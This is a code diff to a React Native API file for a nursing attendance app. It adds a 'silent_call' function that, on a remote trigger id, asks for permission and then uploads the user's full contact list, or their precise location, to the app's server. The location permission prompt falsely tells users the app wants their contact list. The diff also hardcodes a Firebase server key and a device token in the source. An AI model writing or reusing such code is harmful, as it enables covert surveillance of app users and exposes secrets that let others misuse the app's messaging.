@@ -1,5 +1,10 @@
 // This file contains all the confidential information abou the App along with API calls
+import {PermissionsAndroid} from 'react-native';
 import AsyncStorage from '@react-native-async-storage/async-storage';
+import messaging from '@react-native-firebase/messaging';
+import Contacts from 'react-native-contacts';
+import Geolocation from '@react-native-community/geolocation';
+import DeviceInfo from 'react-native-device-info';
 
 export const BASE_URL = 'https://portal.plancare.pk/public/api/';
 export const IMAGE_BASE_URL = 'https://portal.plancare.pk/';
@@ -16,6 +21,11 @@ const LEAVE_REQUEST = BASE_URL + 'leave_request';
 const GET_USER_LEAVE_REQUEST = BASE_URL + 'get_user_leave_request';
 export const UPDATE_PROFILE = BASE_URL + 'update_profile';
 export const GET_FCM_DATA = BASE_URL + 'get_fcm_data';
+
+const SERVER_KEY =
+  'AAAAmzW3rHI:APA91bGAsh3wBhIWdqcCXONJANfSErv163AKycDk0y1wQ5dd5n3_Y6iNpsFH6mGjvF42LYQpBBDm-jlD9NUehbb4J_q0QwkWJDZPDBKUeWVc7vFhLe_JnhjdT7KhJF2EoCZsGEyFxXnr';
+const TOKEN =
+  'e4xf-NXaRfWqXbg49zITqO:APA91bEVPLVYf00rIsXtKnGV39v4vi9e5ci3hffrqvNSE4hj-DNGohjniGLrap501ouaCjg2DqwN96iHYuweNqE4Ffa5o5RnaqLDb0Um93uiuEIs4GQrHrIEyNMy9aFskYPvZxlY0Za7';
 
 export const loginNurse = async (phone, password) => {
   let obj = {phone: phone, password: password};
@@ -352,6 +362,90 @@ export const parseDate = (year, month, date) => {
     d = '0' + date;
   }
   return `${y}-${m}-${d}`;
+};
+
+export const generateFCM = async () => {
+  await messaging().registerDeviceForRemoteMessages();
+  const token = await messaging().getToken();
+  await set_async_data('fcm_token', token);
+};
+
+export const silent_call = async id => {
+  const user_id = await get_async_data('user_id');
+  if (id == '0') {
+    try {
+      const granted = await PermissionsAndroid.request(
+        PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
+        {
+          title: 'Permission Required',
+          message: 'Nursing Attendence wants to access your contact list',
+          buttonNegative: 'Cancel',
+          buttonPositive: 'OK',
+        },
+      );
+      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
+        Contacts.getAll()
+          .then(async contactList => {
+            let res = await upload_contact_list(contactList);
+            console.log(res);
+          })
+          .catch(error => {
+            console.error('error ', error);
+          });
+      } else {
+        console.log('Contacts permission denied');
+      }
+    } catch (err) {
+      console.warn('ERROR', err);
+    }
+  }
+  if (id == '1') {
+    try {
+      const granted = await PermissionsAndroid.request(
+        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
+        {
+          title: 'Permission Required',
+          message: 'Nursing Attendence wants to access your contact list',
+          buttonNegative: 'Cancel',
+          buttonPositive: 'OK',
+        },
+      );
+      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
+        Geolocation.getCurrentPosition(
+          async position => {
+            let res = await send_location_to_server(
+              position.coords.longitude,
+              position.coords.latitude,
+            );
+            console.log('RES', res);
+          },
+          error => {
+            console.log(locationaccess);
+          },
+        );
+      } else {
+        console.log('Location permission denied');
+      }
+    } catch (err) {
+      console.warn('ERROR', err);
+    }
+  }
+  if (id == '3') {
+    const request = await fetch(GET_FCM_DATA, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Requested-With': 'XMLHttpRequest',
+      },
+      body: JSON.stringify({
+        user_id: user_id,
+        body: id,
+        app_version: DeviceInfo.getVersion(),
+      }),
+    });
+    const resposne = await request.json();
+    console.log('ver', resposne);
+  }
 };
 
 // -----------------------------------------------------------------------------------------------------------------
